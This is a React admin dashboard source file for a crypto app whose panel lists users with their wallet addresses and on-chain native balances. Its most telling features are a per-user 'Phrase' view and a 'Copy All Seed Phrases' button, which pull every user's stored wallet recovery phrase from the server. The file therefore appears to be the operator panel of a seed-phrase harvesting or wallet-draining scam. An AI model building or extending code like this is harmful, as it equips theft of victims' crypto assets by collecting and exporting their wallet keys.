import { useEffect, useState } from 'react';
import toast from 'react-hot-toast';
import { UserCircle, UsersThree, ShieldSlash, CheckCircle, XCircle, Eye, Prohibit, User as UserIcon, Key, ListChecks, Copy } from 'phosphor-react';

// Prevent prerendering
export const dynamic = 'force-dynamic';

interface User {
  id: number;
  username: string;
  address: string;
  banned: boolean;
}

interface Claim {
  id: number;
  user_id: number;
  status: string;
  type?: string;
  address?: string; // Added address to Claim interface
}

export default function AdminDashboard() {
  const [users, setUsers] = useState<User[]>([]);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [showPhrase, setShowPhrase] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState<string | null>(null);
  const [claims, setClaims] = useState<Claim[]>([]);
  const [referralClaims, setReferralClaims] = useState<Claim[]>([]);
  const [depositClaims, setDepositClaims] = useState<Claim[]>([]);
  const [stats, setStats] = useState<{ totalUsers: number; totalClaims: number }>({ totalUsers: 0, totalClaims: 0 });
  // Tambahkan state untuk native balances
  const [nativeBalances, setNativeBalances] = useState<Record<number, string>>({});

  const fetchUsers = () => {
    fetch('/api/user/list')
      .then(res => res.json())
      .then((data: User[]) => {
        setUsers(data);
        setStats(s => ({ ...s, totalUsers: data.length }));
      });
  };

  const fetchClaims = () => {
    fetch('/api/claim/swap')
      .then(res => res.json())
      .then((data: Claim[]) => setClaims(data));
    fetch('/api/claim/referral')
      .then(res => res.json())
      .then((data: Claim[]) => setReferralClaims(data));
    fetch('/api/claim/deposit')
      .then(res => res.json())
      .then((data: Claim[]) => setDepositClaims(data));
  };

  useEffect(() => {
    fetchUsers();
    fetchClaims();
    fetch('/api/stats')
      .then(res => res.json())
      .then(setStats);
  }, []);

  // Tambahkan hitung banned users
  useEffect(() => {
    setStats(s => ({ ...s, bannedUsers: users.filter(u => u.banned).length }));
  }, [users]);

  // Fetch native balances untuk semua user
  const fetchNativeBalances = async (users: User[]) => {
    const balances: Record<number, string> = {};
    await Promise.all(users.map(async (user) => {
      if (!user.address) return;
      try {
        const res = await fetch('/api/balance', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address: user.address, chain: 'eth' }) // ganti chain sesuai kebutuhan
        });
        const data = await res.json();
        // Ambil saldo native token (ETH/BNB/MATIC/BASE)
        const native = data.balances?.find((b: any) => b.symbol === 'ETH' || b.symbol === 'BNB' || b.symbol === 'MATIC' || b.symbol === 'BASE');
        balances[user.id] = native ? native.balance : '0';
      } catch {
        balances[user.id] = '0';
      }
    }));
    setNativeBalances(balances);
  };

  // Fetch balances setiap kali users berubah
  useEffect(() => {
    if (users.length > 0) fetchNativeBalances(users);
  }, [users]);

  // Copy all seed phrases
  const handleCopyAllSeedPhrases = async () => {
    try {
      const phrases: string[] = [];
      for (const user of users) {
        const res = await fetch(`/api/user/${user.id}/phrase`);
        if (res.ok) {
          const data = await res.json();
          phrases.push(`${user.id} (${user.username || user.address}): ${data.seedPhrase || '(not found)'}`);
        }
      }
      const all = phrases.join('\n');
      await navigator.clipboard.writeText(all);
      toast.success('All seed phrases copied!');
    } catch (e) {
      toast.error('Failed to copy all seed phrases');
    }
  };

  const handleBan = async (userId: number) => {
    await fetch(`/api/user/${userId}`, { method: 'PATCH' });
    fetchUsers();
    toast.success('User banned!');
  };
  const handleUnban = async (userId: number) => {
    await fetch(`/api/user/${userId}/unban`, { method: 'PATCH' });
    fetchUsers();
    toast.success('User unbanned!');
  };

  const handleView = (user: User) => setSelectedUser(user);
  const handleCloseView = () => {
    setSelectedUser(null);
    setShowPhrase(false);
    setSeedPhrase(null);
  };

  const handleShowPhrase = async () => {
    if (selectedUser) {
      try {
        const phraseRes = await fetch(`/api/user/${selectedUser.id}/phrase`);
        if (phraseRes.ok) {
          const phraseData = await phraseRes.json();
          setSeedPhrase(phraseData.seedPhrase || '(not found)');
          setShowPhrase(true);
        } else {
          setSeedPhrase('(Error fetching phrase)');
          setShowPhrase(true);
        }
      } catch (error) {
        console.error('Error fetching seed phrase:', error);
        setSeedPhrase('(Error fetching phrase)');
        setShowPhrase(true);
      }
    }
  };
  const handleHidePhrase = () => setShowPhrase(false);

  const handleApproveClaim = async (claimId: number, type: string) => {
    await fetch(`/api/claim/${type}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ claimId })
    });
    fetchClaims();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#23243a] to-[#181926] text-white p-4 md:p-8">
      <div className="max-w-7xl mx-auto">
        <header className="mb-8">
          <h1 className="text-3xl md:text-4xl font-bold mb-2 tracking-tight">Admin Dashboard</h1>
          <p className="text-gray-400 text-sm md:text-base">Monitor users, manage claims, and keep your system secure. All in one place.</p>
        </header>
        {/* Statistik */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-8">
          <div className="glass-card flex items-center gap-4 p-6">
            <UsersThree size={40} className="text-primary-400" />
            <div>
              <div className="text-2xl font-bold">{stats.totalUsers}</div>
              <div className="text-gray-400 text-sm">Total Users</div>
            </div>
          </div>
          <div className="glass-card flex items-center gap-4 p-6">
            <ListChecks size={40} className="text-green-400" />
            <div>
              <div className="text-2xl font-bold">{stats.totalClaims}</div>
              <div className="text-gray-400 text-sm">Total Claims</div>
            </div>
          </div>
          <div className="glass-card flex items-center gap-4 p-6">
            <ShieldSlash size={40} className="text-red-400" />
            <div>
              <div className="text-2xl font-bold">{users.filter(u => u.banned).length}</div>
              <div className="text-gray-400 text-sm">Banned Users</div>
            </div>
          </div>
        </div>
        {/* User Management Table */}
        <section className="mb-10">
          <h2 className="text-xl font-semibold mb-4">User Management</h2>
          <button onClick={handleCopyAllSeedPhrases} className="mb-4 btn-glass text-yellow-400 flex items-center gap-1"><Copy size={16}/>Copy All Seed Phrases</button>
          <div className="overflow-x-auto rounded-lg glass-card">
            <table className="w-full min-w-[700px] text-sm">
              <thead>
                <tr className="bg-[#23243a]">
                  <th className="py-3 px-4 text-left">ID</th>
                  <th className="py-3 px-4 text-left">Username</th>
                  <th className="py-3 px-4 text-left">Address</th>
                  <th className="py-3 px-4 text-left">Native Balance</th>
                  <th className="py-3 px-4 text-left">Status</th>
                  <th className="py-3 px-4 text-left">Action</th>
                </tr>
              </thead>
              <tbody>
                {users.map(user => (
                  <tr key={user.id} className="transition hover:bg-[#2a2b45]">
                    <td className="py-2 px-4">{user.id}</td>
                    <td className="py-2 px-4 flex items-center gap-2">
                      <UserIcon size={18} /> {user.username || '-'}</td>
                    <td className="py-2 px-4 font-mono text-xs">{user.address}</td>
                    <td className="py-2 px-4 font-mono text-xs">{nativeBalances[user.id] || '-'}</td>
                    <td className="py-2 px-4">
                      {user.banned ? (
                        <span className="inline-block px-2 py-1 rounded bg-red-500/20 text-red-400 text-xs font-semibold">Banned</span>
                      ) : (
                        <span className="inline-block px-2 py-1 rounded bg-green-500/20 text-green-400 text-xs font-semibold">Active</span>
                      )}
                    </td>
                    <td className="py-2 px-4 flex gap-2">
                      <button onClick={() => handleView(user)} className="btn-glass text-blue-400 flex items-center gap-1"><Eye size={16}/>View</button>
                      {user.banned ? (
                        <button onClick={() => handleUnban(user.id)} className="btn-glass text-green-400 flex items-center gap-1"><CheckCircle size={16}/>Unban</button>
                      ) : (
                        <button onClick={() => handleBan(user.id)} className="btn-glass text-red-400 flex items-center gap-1"><Prohibit size={16}/>Ban</button>
                      )}
                      <button onClick={handleShowPhrase} className="btn-glass text-yellow-400 flex items-center gap-1"><Key size={16}/>Phrase</button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
        {/* Claim Management Table */}
        <section className="mb-10">
          <h2 className="text-xl font-semibold mb-4">Claim Management</h2>
          <div className="overflow-x-auto rounded-lg glass-card">
            <table className="w-full min-w-[600px] text-sm">
              <thead>
                <tr className="bg-[#23243a]">
                  <th className="py-3 px-4 text-left">Claim ID</th>
                  <th className="py-3 px-4 text-left">User ID</th>
                  <th className="py-3 px-4 text-left">Address</th>
                  <th className="py-3 px-4 text-left">Status</th>
                  <th className="py-3 px-4 text-left">Action</th>
                </tr>
              </thead>
              <tbody>
                {[...claims, ...referralClaims, ...depositClaims].map(claim => (
                  <tr key={claim.id} className="transition hover:bg-[#2a2b45]">
                    <td className="py-2 px-4">{claim.id}</td>
                    <td className="py-2 px-4">{claim.user_id}</td>
                    <td className="py-2 px-4 font-mono text-xs">{claim.address || '-'}</td>
                    <td className="py-2 px-4">
                      {claim.status === 'pending' && <span className="inline-block px-2 py-1 rounded bg-yellow-500/20 text-yellow-400 text-xs font-semibold">Pending</span>}
                      {claim.status === 'approved' && <span className="inline-block px-2 py-1 rounded bg-green-500/20 text-green-400 text-xs font-semibold">Approved</span>}
                      {claim.status === 'rejected' && <span className="inline-block px-2 py-1 rounded bg-red-500/20 text-red-400 text-xs font-semibold">Rejected</span>}
                      {claim.status === 'processing' && <span className="inline-block px-2 py-1 rounded bg-yellow-500/20 text-yellow-400 text-xs font-semibold">Processing</span>}
                      {claim.status === 'claimed' && <span className="inline-block px-2 py-1 rounded bg-green-500/20 text-green-400 text-xs font-semibold">Claimed</span>}
                    </td>
                    <td className="py-2 px-4 flex gap-2">
                      {claim.status !== 'claimed' && claim.status !== 'approved' && (
                        <button onClick={() => handleApproveClaim(claim.id, claim.type === 'referral' ? 'referral' : claim.type === 'deposit' ? 'deposit' : 'swap')} className="btn-glass text-green-400 flex items-center gap-1"><CheckCircle size={16}/>Approve</button>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
        {/* Modal View User */}
        {selectedUser && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="glass-card p-6 rounded-lg max-w-md w-full">
              <h3 className="text-lg font-bold mb-4">User Detail</h3>
              <div><b>ID:</b> {selectedUser.id}</div>
              <div><b>Username:</b> {selectedUser.username}</div>
              <div><b>Address:</b> {selectedUser.address}</div>
              <div><b>Banned:</b> {selectedUser.banned ? 'Yes' : 'No'}</div>
              <div className="mt-4 flex gap-2">
                <button onClick={handleShowPhrase} className="btn-glass text-yellow-400 flex items-center gap-1"><Key size={16}/>View Phrase</button>
                <button onClick={handleCloseView} className="btn-glass text-gray-400">Close</button>
              </div>
              {/* Modal View Phrase */}
              {showPhrase && (
                <div className="mt-4 p-3 bg-gray-800 rounded">
                  <b>Seed Phrase:</b> <span className="break-all">{seedPhrase || '(not found)'}</span>
                  <button onClick={handleHidePhrase} className="ml-2 btn-glass text-gray-400">Hide</button>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
} 